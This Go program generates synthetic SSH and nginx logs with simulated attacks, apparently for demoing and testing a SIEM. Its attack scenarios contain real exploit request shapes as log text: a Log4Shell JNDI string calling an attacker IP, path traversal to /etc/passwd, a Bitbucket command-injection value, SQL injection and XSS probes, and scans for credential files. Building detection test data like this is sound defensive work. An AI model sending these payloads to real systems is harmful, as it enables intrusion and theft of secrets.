// Command loggen generates realistic SSH and web logs, with attacks mixed
// in, to demo and test the SIEM. It either posts lines to a running server's
// ingest API or appends them to log files for the server to tail.
//
// Attack traffic comes from the RFC 5737 documentation ranges
// (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24); normal traffic from
// private 10.0.0.0/8 addresses. Nothing is ever sent to those hosts: they
// only appear inside the generated log text.
package main

import (
	"bytes"
	"context"
	"errors"
	"flag"
	"fmt"
	"math/rand/v2"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"time"
)

func main() {
	url := flag.String("url", "http://127.0.0.1:8080", "SIEM server to post to (ignored with -ssh-file/-web-file)")
	token := flag.String("token", os.Getenv("SIEM_TOKEN"), "API token, if the server requires one")
	sshFile := flag.String("ssh-file", "", "append SSH lines to this file instead of posting")
	webFile := flag.String("web-file", "", "append web access lines to this file instead of posting")
	rate := flag.Float64("rate", 5, "normal events per second")
	attackEvery := flag.Duration("attack-every", 20*time.Second, "average gap between attack scenarios")
	duration := flag.Duration("duration", 0, "stop after this long (0 runs until interrupted)")
	once := flag.Bool("once", false, "send a little normal traffic plus every attack scenario once, then exit")
	flag.Parse()

	var sink Sink
	if *sshFile != "" || *webFile != "" {
		if *sshFile == "" || *webFile == "" {
			fatal("use -ssh-file and -web-file together")
		}
		sink = &FileSink{paths: map[string]string{"ssh": *sshFile, "nginx": *webFile}}
	} else {
		sink = &HTTPSink{base: strings.TrimRight(*url, "/"), token: *token, client: &http.Client{Timeout: 10 * time.Second}}
	}

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
	defer stop()
	if *duration > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, *duration)
		defer cancel()
	}

	g := &Gen{rng: rand.New(rand.NewPCG(uint64(time.Now().UnixNano()), 42))}

	if *once {
		send(ctx, sink, g.normal(40))
		for _, sc := range g.scenarios() {
			fmt.Printf("scenario: %s\n", sc.name)
			send(ctx, sink, sc.run())
		}
		return
	}

	fmt.Printf("generating ~%.0f events/s with an attack every ~%s; Ctrl-C to stop\n", *rate, *attackEvery)
	tick := time.NewTicker(time.Second)
	defer tick.Stop()
	nextAttack := time.Now().Add(g.jitter(*attackEvery))
	for {
		select {
		case <-ctx.Done():
			return
		case now := <-tick.C:
			n := int(*rate)
			if g.rng.Float64() < *rate-float64(n) {
				n++
			}
			send(ctx, sink, g.normal(n))
			if now.After(nextAttack) {
				scs := g.scenarios()
				sc := scs[g.rng.IntN(len(scs))]
				fmt.Printf("%s attack: %s\n", now.Format("15:04:05"), sc.name)
				send(ctx, sink, sc.run())
				nextAttack = now.Add(g.jitter(*attackEvery))
			}
		}
	}
}

func fatal(msg string) {
	fmt.Fprintln(os.Stderr, "loggen:", msg)
	os.Exit(2)
}

// Line is one generated log line and the parser that reads it.
type Line struct {
	parser string // "ssh" or "nginx"
	text   string
}

func send(ctx context.Context, s Sink, lines []Line) {
	if len(lines) == 0 || ctx.Err() != nil {
		return
	}
	if err := s.Write(ctx, lines); err != nil && !errors.Is(err, context.Canceled) {
		fmt.Fprintln(os.Stderr, "loggen:", err)
	}
}

// Sink receives generated lines.
type Sink interface {
	Write(ctx context.Context, lines []Line) error
}

// HTTPSink posts lines to /api/ingest, one request per parser.
type HTTPSink struct {
	base, token string
	client      *http.Client
}

func (s *HTTPSink) Write(ctx context.Context, lines []Line) error {
	byParser := map[string]*bytes.Buffer{}
	for _, l := range lines {
		b := byParser[l.parser]
		if b == nil {
			b = &bytes.Buffer{}
			byParser[l.parser] = b
		}
		b.WriteString(l.text)
		b.WriteByte('\n')
	}
	for p, body := range byParser {
		req, err := http.NewRequestWithContext(ctx, http.MethodPost, s.base+"/api/ingest?parser="+p, body)
		if err != nil {
			return err
		}
		req.Header.Set("Content-Type", "text/plain")
		if s.token != "" {
			req.Header.Set("Authorization", "Bearer "+s.token)
		}
		resp, err := s.client.Do(req)
		if err != nil {
			return err
		}
		resp.Body.Close()
		if resp.StatusCode != http.StatusAccepted {
			return fmt.Errorf("ingest %s: %s", p, resp.Status)
		}
	}
	return nil
}

// FileSink appends lines to per-parser files.
type FileSink struct {
	mu    sync.Mutex
	paths map[string]string
}

func (s *FileSink) Write(_ context.Context, lines []Line) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	byPath := map[string]*strings.Builder{}
	for _, l := range lines {
		p := s.paths[l.parser]
		if byPath[p] == nil {
			byPath[p] = &strings.Builder{}
		}
		byPath[p].WriteString(l.text + "\n")
	}
	for p, b := range byPath {
		f, err := os.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
		if err != nil {
			return err
		}
		_, err = f.WriteString(b.String())
		f.Close()
		if err != nil {
			return err
		}
	}
	return nil
}

// Gen produces log lines.
type Gen struct {
	rng *rand.Rand
}

func (g *Gen) jitter(d time.Duration) time.Duration {
	return time.Duration(float64(d) * (0.5 + g.rng.Float64()))
}

func (g *Gen) pick(xs []string) string { return xs[g.rng.IntN(len(xs))] }

var (
	pages = []string{"/", "/", "/", "/about", "/pricing", "/blog", "/blog/hello-world", "/contact",
		"/api/items", "/api/items/42", "/api/cart", "/static/app.js", "/static/style.css", "/favicon.ico"}
	agents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
		"Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
	}
	scanPaths = []string{"/.env", "/.git/config", "/wp-admin/", "/wp-login.php", "/phpmyadmin/", "/admin", "/backup.zip",
		"/config.php.bak", "/.aws/credentials", "/server-status", "/actuator/env", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
		"/cgi-bin/luci", "/HNAP1/", "/boaform/admin/formLogin", "/.DS_Store", "/api/v1/users", "/console", "/solr/admin/info/system", "/owa/"}
	sprayUsers = []string{"admin", "test", "oracle", "postgres", "ubuntu", "git", "user", "pi", "support", "guest", "ftpuser", "deploy"}
	staff      = []string{"roy", "deploy", "ci"}
)

func (g *Gen) clientIP() string {
	return fmt.Sprintf("10.%d.%d.%d", g.rng.IntN(4), g.rng.IntN(256), 1+g.rng.IntN(254))
}

func (g *Gen) attackerIP() string {
	nets := []string{"192.0.2", "198.51.100", "203.0.113"}
	return fmt.Sprintf("%s.%d", g.pick(nets), 1+g.rng.IntN(254))
}

func webLine(ip, method, path string, status, bytes int, agent string, t time.Time) Line {
	return Line{"nginx", fmt.Sprintf(`%s - - [%s] "%s %s HTTP/1.1" %d %d "-" "%s"`,
		ip, t.Format("02/Jan/2006:15:04:05 -0700"), method, path, status, bytes, agent)}
}

func sshLine(msg string, t time.Time) Line {
	return Line{"ssh", fmt.Sprintf("%s web-01 sshd[%d]: %s", t.Format("Jan _2 15:04:05"), 1000+rand.IntN(60000), msg)}
}

// normal returns n lines of everyday traffic.
func (g *Gen) normal(n int) []Line {
	now := time.Now()
	lines := make([]Line, 0, n)
	for i := 0; i < n; i++ {
		if g.rng.IntN(40) == 0 {
			u := g.pick(staff)
			lines = append(lines, sshLine(fmt.Sprintf("Accepted publickey for %s from 10.0.0.%d port %d ssh2: ED25519 SHA256:x", u, 2+g.rng.IntN(5), 40000+g.rng.IntN(20000)), now))
			continue
		}
		status := 200
		switch r := g.rng.IntN(100); {
		case r < 6:
			status = 304
		case r < 9:
			status = 404
		case r < 10:
			status = 500
		}
		method := "GET"
		if g.rng.IntN(15) == 0 {
			method = "POST"
		}
		lines = append(lines, webLine(g.clientIP(), method, g.pick(pages), status, 200+g.rng.IntN(40000), g.pick(agents), now))
	}
	return lines
}

type scenario struct {
	name string
	run  func() []Line
}

// scenarios returns each attack, timestamped now, so live windows apply.
func (g *Gen) scenarios() []scenario {
	return []scenario{
		{"SSH brute force on root", func() []Line {
			ip, now := g.attackerIP(), time.Now()
			var out []Line
			for i := 0; i < 8+g.rng.IntN(10); i++ {
				out = append(out, sshLine(fmt.Sprintf("Failed password for root from %s port %d ssh2", ip, 30000+g.rng.IntN(30000)), now))
			}
			return out
		}},
		{"SSH password spraying", func() []Line {
			ip, now := g.attackerIP(), time.Now()
			var out []Line
			for _, u := range sprayUsers[:5+g.rng.IntN(len(sprayUsers)-5)] {
				out = append(out,
					sshLine(fmt.Sprintf("Invalid user %s from %s port %d", u, ip, 30000+g.rng.IntN(30000)), now),
					sshLine(fmt.Sprintf("Failed password for invalid user %s from %s port %d ssh2", u, ip, 30000+g.rng.IntN(30000)), now))
			}
			return out
		}},
		{"SSH brute force that succeeds", func() []Line {
			ip, now := g.attackerIP(), time.Now()
			var out []Line
			for i := 0; i < 6; i++ {
				out = append(out, sshLine(fmt.Sprintf("Failed password for deploy from %s port %d ssh2", ip, 30000+g.rng.IntN(30000)), now))
			}
			return append(out, sshLine(fmt.Sprintf("Accepted password for deploy from %s port %d ssh2", ip, 30000+g.rng.IntN(30000)), now))
		}},
		{"web vulnerability scan", func() []Line {
			ip, now := g.attackerIP(), time.Now()
			agent := g.pick([]string{"Mozilla/5.0 zgrab/0.x", "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)", "sqlmap/1.8", "python-requests/2.32"})
			var out []Line
			for _, p := range scanPaths {
				out = append(out, webLine(ip, "GET", p, 404, 153, agent, now))
			}
			return out
		}},
		{"SQL injection probe", func() []Line {
			ip, now := g.attackerIP(), time.Now()
			probes := []string{
				"/api/items?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
				"/search?q=%27%20OR%20%271%27=%271",
				"/api/items?id=1;SELECT%20sleep(5)",
				"/download?file=../../../../etc/passwd",
				"/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
			}
			var out []Line
			for _, p := range probes[:2+g.rng.IntN(len(probes)-1)] {
				out = append(out, webLine(ip, "GET", p, 200+g.rng.IntN(2)*300, 512, "sqlmap/1.8", now))
			}
			return out
		}},
		{"known exploit payloads (CVE probes)", func() []Line {
			ip, now := g.attackerIP(), time.Now()
			// Request shapes from public exploits; most only trip a
			// detection when the server answered 200.
			probes := []struct {
				method, path, agent string
				status              int
			}{
				{"GET", "/?x=${jndi:ldap://" + ip + ":1389/Exploit}", "${jndi:ldap://" + ip + ":1389/a}", 200},                               // Log4Shell
				{"GET", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd", "curl/8.4.0", 200},                                                        // Apache CVE-2021-41773
				{"GET", "/public/plugins/loki/../../../../../../../../etc/passwd", "Mozilla/5.0", 200},                                       // Grafana CVE-2021-43798
				{"GET", "/console/css/%2e%2e%2fconsole.portal", "Mozilla/5.0", 200},                                                          // WebLogic CVE-2020-14882
				{"GET", "/rest/api/latest/projects/P/repos/r/archive?prefix=ax%00--exec=%60id%60%00--remote=x", "python-requests/2.32", 200}, // Bitbucket CVE-2022-36804
				{"POST", "/SAAS/jersey/manager/api/migrate/tenant", "python-requests/2.32", 200},                                             // VMware CVE-2022-31659
				{"GET", "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E", "Mozilla/5.0", 200},                                     // XSS
			}
			g.rng.Shuffle(len(probes), func(i, j int) { probes[i], probes[j] = probes[j], probes[i] })
			var out []Line
			for _, p := range probes[:3+g.rng.IntN(len(probes)-2)] {
				out = append(out, webLine(ip, p.method, p.path, p.status, 180, p.agent, now))
			}
			return out
		}},
		{"web login brute force", func() []Line {
			ip, now := g.attackerIP(), time.Now()
			var out []Line
			for i := 0; i < 12+g.rng.IntN(10); i++ {
				out = append(out, webLine(ip, "POST", "/wp-login.php", 403, 220, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", now))
			}
			return out
		}},
	}
}
